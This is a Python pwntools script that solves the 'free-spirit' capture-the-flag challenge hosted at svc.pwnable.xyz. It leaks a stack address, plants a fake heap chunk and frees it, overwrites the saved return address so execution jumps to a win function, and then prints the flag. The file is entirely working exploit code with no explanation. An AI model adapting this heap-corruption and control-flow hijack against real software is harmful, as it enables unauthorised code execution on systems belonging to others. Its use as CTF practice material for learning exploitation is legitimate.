#!/usr/bin/env python3
from pwn import *
import sys, pwnlib, struct

pwnlib.args.SILENT(True)
BINPATH = './free-spirit'
HOST = 'svc.pwnable.xyz'
PORT = 30005

def main(argc, argv):
    modes = ['local', 'remote']
    if(argc < 2):
        return 0
    mode = argv[1].lower()
    if(mode not in modes):
        return 0

    p = process(BINPATH) if mode == modes[0] else remote(HOST, PORT)
    death = p.kill if mode == modes[0] else p.close


    win_addr = struct.pack('<Q', 0x400a3e)
    fchunk_addr = 0x601038
    fake_chunk = (b'\x51'+b'\x00'*7)+struct.pack('<Q', fchunk_addr+8)+b'A'*4

    p.recvuntil(b'> ')
    p.send(b'2\n')
    leak = int(p.recvline()[:-1].decode(), base=16)
    print(f"\"Leaked\" stack address: 0x{leak:08x}")
    retaddr = leak+88

    print(f"Return address is at:   0x{retaddr:08x}")
    print(f"Local fake chunk will be at: 0x{fchunk_addr:08x}")
    p.recvuntil(b'> ')

    p.send(b'1\n'+b'\0'*(0x30-2))
    p.send(struct.pack('<Q', fchunk_addr)+struct.pack('<Q', retaddr-0x10))
    p.recvuntil(b'> ')
    
    p.send(b'3\n')
    p.recvuntil(b'> ')

    p.send(b'1\n'+b'\0'*(0x30-2))
    p.send(b'\xaf\xbe\xad\xde'*2+struct.pack('<Q', fchunk_addr)+win_addr+b'\n')
    p.recvuntil(b'> ')

    p.send(b'3\n')
    p.recvuntil(b'> ')
    p.send(b'1\n'+b'\0'*(0x30-2))
    p.send(fake_chunk+b'\n')
    
    p.recvuntil(b'> ')
    p.send(b'3\n')
    p.recvuntil(b'> ')
    p.send(B'0\n')
    flag = p.recv().decode()
    if(mode == modes[0]):
        if("cat" in flag):
            print("Success!!!")
    else:
        print(f"Flag: {flag:s}")


    death()
    return 0

if(__name__=='__main__'):
    try:
        exit(main(len(sys.argv), sys.argv))
    except KeyboardInterrupt:
        exit(130)